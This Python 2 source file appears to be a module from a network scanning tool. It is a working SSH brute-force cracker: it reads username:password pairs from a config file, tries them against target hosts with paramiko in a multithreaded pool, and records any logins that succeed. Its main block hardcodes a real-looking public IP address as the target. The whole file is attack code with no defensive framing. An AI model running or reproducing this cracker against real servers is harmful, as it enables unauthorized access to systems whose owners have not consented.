#coding=utf-8
import time
import threading
from multiprocessing.dummy import Pool
from printers import printPink,printGreen
import paramiko


class ssh_burp(object):
    
    def __init__(self,c):
        self.config=c
        self.lock=threading.Lock()
        self.result=[]
        self.lines=self.config.file2list("conf/ssh.conf")

    def ssh_connect(self,ip,username,password,port):
        crack=0
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip,port,username=username, password=password)
            crack=1
            client.close()
        except Exception,e:
            if e[0]=='Authentication failed.':
                self.lock.acquire()
                print "%s ssh service 's %s:%s login fail " %(ip,username,password)
                self.lock.release()
            else:
                self.lock.acquire()
                print "connect %s ssh service at %s login fail " %(ip,port)
                self.lock.release()
                crack=2
        return crack

    def ssh_l(self,ip,port):
            try:
                for data in self.lines:
                    username=data.split(':')[0]
                    password=data.split(':')[1]
                    flag=self.ssh_connect(ip,username,password,port)
                    if flag==2:
                        break
                    if flag==1:
                        self.lock.acquire()
                        printGreen("%s ssh at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.result.append("%s ssh at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.lock.release()
                        break
            except Exception,e:
                pass

    def run(self,ipdict,pinglist,threads,file):
        if len(ipdict['ssh']):
            printPink("crack ssh  now...")
            print "[*] start crack ssh  %s" % time.ctime()
            starttime=time.time()

            pool=Pool(threads)

            for ip in ipdict['ssh']:
                pool.apply_async(func=self.ssh_l,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))

            pool.close()
            pool.join()

            print "[*] stop ssh serice  %s" % time.ctime()
            print "[*] crack ssh done,it has Elapsed time:%s " % (time.time()-starttime)

            for i in xrange(len(self.result)):
                self.config.write_file(contents=self.result[i],file=file)   



if __name__ == '__main__':
    import sys
    sys.path.append("../")
    from comm.config import *
    c=config()
    ipdict={'ssh': ['139.129.30.58:22']} 
    pinglist=['122.225.81.129']
    test=ssh_burp(c)
    test.run(ipdict,pinglist,50,file="../result/test")